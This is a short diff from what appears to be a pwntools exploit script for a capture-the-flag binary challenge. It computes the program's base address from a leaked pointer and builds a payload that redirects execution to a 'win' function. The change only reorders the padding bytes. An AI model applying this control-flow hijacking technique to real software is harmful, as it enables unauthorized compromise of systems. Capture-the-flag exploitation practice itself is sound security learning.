@@ -199,7 +199,7 @@ elf.address = init - (0x565561bd - 0x56555000)
 log.info("Elf base address: 0x%x", elf.address)
 log.info("Jumping to address: 0x%x", elf.sym['win'])
 
-payload = p32(elf.sym['win']) + b'A'*4 + b'C'*4 + b'D'*4 + b'D'
+payload = p32(elf.sym['win']) + b'A'*4 + b'B'*4 + b'C'*4 + b'D'
 
 io.recvuntil('Your turn:')
 io.send(payload)
